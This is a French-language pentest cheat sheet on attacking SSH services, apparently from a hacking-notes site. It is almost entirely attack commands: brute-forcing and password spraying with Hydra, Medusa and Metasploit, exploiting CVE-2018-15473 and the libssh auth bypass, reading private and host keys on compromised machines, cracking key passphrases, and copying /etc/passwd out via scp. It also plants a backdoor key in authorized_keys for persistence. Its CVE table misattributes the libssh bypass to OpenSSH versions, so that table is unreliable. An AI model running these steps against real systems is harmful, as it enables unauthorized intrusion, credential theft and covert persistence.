# SSH Enumeration

SSH (Secure Shell) est un protocole de communication sécurisé utilisé pour l'administration distante des systèmes Linux, Unix et Windows. Bien que chiffré, SSH reste une cible en pentest pour l'énumération de versions vulnérables, le bruteforce de credentials et l'exploitation de mauvaises configurations.

## Objectifs

- Identifier la version du serveur SSH
- Enumérer les méthodes d'authentification acceptées
- Tester les credentials par défaut ou faibles
- Identifier des versions vulnérables (OpenSSH, Dropbear)
- Exploiter les mauvaises configurations

## Ports

| Port | Service |
|---|---|
| 22 | SSH (par défaut) |
| 2222 | SSH (alternatif courant) |
| 2022 | SSH (alternatif) |

## Quick Enumeration

::: code-group
```bash [Nmap]
nmap -p22 --script ssh-auth-methods,ssh-hostkey,ssh2-enum-algos <target>
```
```bash [Netexec]
nxc ssh <target> -u user -p password
```
```bash [Hydra]
hydra -L users.txt -P passwords.txt ssh://<target>
```
```bash [Metasploit]
use auxiliary/scanner/ssh/ssh_version
use auxiliary/scanner/ssh/ssh_login
```

:::

## Workflow Pentest
```
1. Scan du port 22
2. Identification de la version SSH
3. Enumération des méthodes d'authentification
4. Enumération des algorithmes supportés
5. Test des credentials par défaut
6. Bruteforce / Password spraying
7. Exploitation de version vulnérable
8. Tentative d'accès avec clés SSH trouvées
```

## Nmap

### Scan basique
```bash
nmap -p22 <target>
```

### Détection version
```bash
nmap -p22 -sV <target>
```

### Scripts NSE
```bash
# Version SSH
nmap -p22 --script ssh-hostkey <target>

# Méthodes d'authentification
nmap -p22 --script ssh-auth-methods <target>
nmap -p22 --script ssh-auth-methods --script-args="ssh.user=root" <target>

# Algorithmes supportés
nmap -p22 --script ssh2-enum-algos <target>

# Bruteforce
nmap -p22 --script ssh-brute <target>
nmap -p22 --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt <target>

# Full enum
nmap -p22 --script ssh-* <target>
```

## Enumeration

### Banner grabbing

::: code-group
```bash [Netcat]
nc -nv <target> 22
```
```bash [curl]
curl -v ssh://<target>
```
```bash [Telnet]
telnet <target> 22
```

:::

### Méthodes d'authentification
```bash
# Via nmap
nmap -p22 --script ssh-auth-methods --script-args="ssh.user=root" <target>

# Via ssh-audit
ssh-audit <target>

# Manuellement
ssh -v user@<target> 2>&1 | grep "Authentications"
```

### Algorithmes et chiffrement
```bash
# SSH Audit — analyse complète
ssh-audit <target>
ssh-audit -p 2222 <target>

# Nmap
nmap -p22 --script ssh2-enum-algos <target>

# Manuellement
ssh -vv user@<target> 2>&1 | grep -E "kex|cipher|mac|host key"
```

### Hostkey fingerprint
```bash
# Via ssh-keyscan
ssh-keyscan <target>
ssh-keyscan -t rsa,dsa,ecdsa,ed25519 <target>

# Via nmap
nmap -p22 --script ssh-hostkey --script-args ssh_hostkey=full <target>

# Manuellement
ssh -o StrictHostKeyChecking=no user@<target>
```

## Credentials Attacks

### Bruteforce Hydra
```bash
# User unique
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target>

# Liste d'users
hydra -L users.txt -P passwords.txt ssh://<target>

# Avec port personnalisé
hydra -L users.txt -P passwords.txt ssh://<target> -s 2222

# Limiter les threads (discrétion)
hydra -L users.txt -P passwords.txt ssh://<target> -t 4
```

### Bruteforce Medusa
```bash
medusa -h <target> -U users.txt -P passwords.txt -M ssh
```

### Bruteforce Ncrack
```bash
ncrack -p 22 -U users.txt -P passwords.txt <target>
```

### Password spraying NetExec
```bash
nxc ssh <target> -u users.txt -p Password123!
nxc ssh <target> -u users.txt -p passwords.txt
```

### Metasploit
```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <target>
set USER_FILE users.txt
set PASS_FILE passwords.txt
set STOP_ON_SUCCESS true
run
```

## Exploitation

### Versions vulnérables courantes

| Version | CVE | Description |
|---|---|---|
| OpenSSH < 7.7 | CVE-2018-15473 | Username enumeration |
| OpenSSH 2.3 - 7.7 | CVE-2018-10933 | LibSSH auth bypass |
| OpenSSH < 6.6 | CVE-2014-1692 | Memory corruption |
| OpenSSH 5.6 - 6.9 | CVE-2015-5600 | Keyboard-interactive auth |

### CVE-2018-15473 — Username Enumeration
```bash
# Enumérer les utilisateurs valides
python3 ssh_enum.py <target> -U /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt

# Via Metasploit
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS <target>
set USER_FILE /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
run
```

### CVE-2018-10933 — LibSSH Auth Bypass
```bash
# Connexion sans credentials
python3 libssh_auth_bypass.py <target> 22

# Via Metasploit
use auxiliary/scanner/ssh/libssh_auth_bypass
set RHOSTS <target>
set SPAWN_PTY true
run
```

### Recherche d'exploits
```bash
searchsploit openssh
searchsploit openssh <version>
searchsploit libssh
```

## Clés SSH

### Recherche de clés SSH exposées
```bash
# Sur la cible compromise
find / -name "id_rsa" 2>/dev/null
find / -name "id_ecdsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# Emplacements courants
cat ~/.ssh/id_rsa
cat ~/.ssh/id_ecdsa
cat ~/.ssh/authorized_keys
cat ~/.ssh/known_hosts
cat /etc/ssh/ssh_host_rsa_key
cat /root/.ssh/id_rsa
```

### Utiliser une clé SSH trouvée
```bash
# Connexion avec clé privée
chmod 600 id_rsa
ssh -i id_rsa user@<target>

# Port personnalisé
ssh -i id_rsa user@<target> -p 2222

# Ignorer la vérification host
ssh -i id_rsa -o StrictHostKeyChecking=no user@<target>
```

### Cracker une clé SSH protégée par passphrase
```bash
# Extraire le hash
ssh2john id_rsa > hash.txt

# Cracker avec John
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Cracker avec Hashcat
hashcat -m 22931 hash.txt /usr/share/wordlists/rockyou.txt
```

## Mauvaises Configurations

### Vérifier la configuration SSH
```bash
# Fichier de configuration serveur
cat /etc/ssh/sshd_config

# Paramètres dangereux à chercher
grep -E "PermitRootLogin|PasswordAuthentication|PermitEmptyPasswords|AuthorizedKeysFile|X11Forwarding|AllowUsers|DenyUsers" /etc/ssh/sshd_config
```

### Paramètres dangereux

| Paramètre | Valeur dangereuse | Risque |
|---|---|---|
| `PermitRootLogin` | `yes` | Login root direct |
| `PasswordAuthentication` | `yes` | Bruteforce possible |
| `PermitEmptyPasswords` | `yes` | Connexion sans mot de passe |
| `X11Forwarding` | `yes` | Forwarding graphique |
| `AllowAgentForwarding` | `yes` | Agent SSH forwardé |
| `GatewayPorts` | `yes` | Port forwarding distant |

## Post-Exploitation via SSH

### Tunneling SSH
```bash
# Local port forwarding
ssh -L 8080:localhost:80 user@<target>

# Remote port forwarding
ssh -R 4444:localhost:4444 user@<target>

# Dynamic SOCKS proxy
ssh -D 1080 user@<target>

# ProxyChains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains nmap -sT <internal_target>
```

### Transfert de fichiers via SSH
```bash
# SCP upload
scp -i id_rsa file.txt user@<target>:/tmp/

# SCP download
scp -i id_rsa user@<target>:/etc/passwd /tmp/

# SFTP
sftp -i id_rsa user@<target>
```

### Persistance via SSH
```bash
# Générer une clé SSH
ssh-keygen -t ed25519 -f /tmp/backdoor

# Ajouter la clé publique
cat /tmp/backdoor.pub >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Connexion persistante
ssh -i /tmp/backdoor user@<target>
```

## Anonymous Access

### Test connexion sans credentials
```bash
# Test root sans mot de passe
ssh root@<target>

# Test utilisateurs courants
ssh guest@<target>
ssh admin@<target>
ssh ubuntu@<target>
ssh pi@<target>
```

### Credentials par défaut courants

| Utilisateur | Mot de passe | Contexte |
|---|---|---|
| root | root | Systèmes mal configurés |
| admin | admin | Appliances réseau |
| pi | raspberry | Raspberry Pi |
| ubuntu | ubuntu | Images Ubuntu cloud |
| vagrant | vagrant | Environnements Vagrant |
| ec2-user | (clé SSH) | AWS EC2 |

## Points d'attaque

- Version SSH obsolète et vulnérable
- Authentification par mot de passe activée
- `PermitRootLogin yes` — login root direct
- `PermitEmptyPasswords yes` — connexion sans mot de passe
- Clés SSH privées exposées sur le système
- Mots de passe faibles ou par défaut
- Username enumeration (CVE-2018-15473)
- Clés SSH sans passphrase

::: info Tips 

- `ssh-audit` est l'outil le plus complet pour analyser la configuration SSH d'un serveur
- Toujours chercher des fichiers `id_rsa` sur les systèmes compromis — ils permettent souvent de pivoter
- Le bruteforce SSH génère beaucoup de logs — privilégier le password spraying avec `-t 4`
- `ssh-keyscan` permet de collecter les hostkeys sans authentification
- Une clé SSH sans passphrase trouvée sur un serveur web peut donner accès à d'autres machines
- Le tunneling SSH dynamique (`-D 1080`) combiné avec ProxyChains est idéal pour le pivoting
- Vérifier `~/.ssh/known_hosts` — révèle les autres machines auxquelles l'utilisateur s'est connecté

:::

::: details Checklist

- Port 22 ouvert identifié
- Version SSH détectée
- Méthodes d'authentification énumérées
- Algorithmes analysés (ssh-audit)
- Credentials par défaut testés
- Bruteforce effectué
- Username enumeration tentée
- Clés SSH recherchées sur le système
- Version vulnérable exploitée
- Tunneling SSH configuré si nécessaire

:::

## Notes
```
 # Notes terrain
``` 

## Tools

- [Nmap](https://nmap.org/)
- [ssh-audit](https://github.com/jtesta/ssh-audit)
- [Hydra](https://github.com/vanhauser-thc/thc-hydra)
- [Medusa](https://github.com/jmk-foofus/medusa)
- [NetExec (NXC)](https://github.com/Pennyw0rth/NetExec)
- [Metasploit](https://www.metasploit.com/)
- [ssh2john](https://github.com/openwall/john)
- [ssh-keyscan](https://linux.die.net/man/1/ssh-keyscan)

## Ressources

- [HackTricks SSH Pentesting](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh)
- [PayloadsAllTheThings SSH](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [ssh-audit Documentation](https://github.com/jtesta/ssh-audit)
- [CVE-2018-15473](https://nvd.nist.gov/vuln/detail/CVE-2018-15473)
- [CVE-2018-10933](https://nvd.nist.gov/vuln/detail/CVE-2018-10933)





<div class="page-footer">

<span>![Last updated](https://img.shields.io/github/last-commit/Hackthus/The-Hackers-237?label=Last%20updated&style=flat-square&color=gray)</span>

<span>[![Edit this page on GitHub](https://img.shields.io/badge/✏️%20Edit%20this%20page-GitHub-black?style=flat-square&logo=github)](https://github.com/Hackthus/The-Hackers-237/edit/main/docs/enumeration/ssh.md)</span>

</div>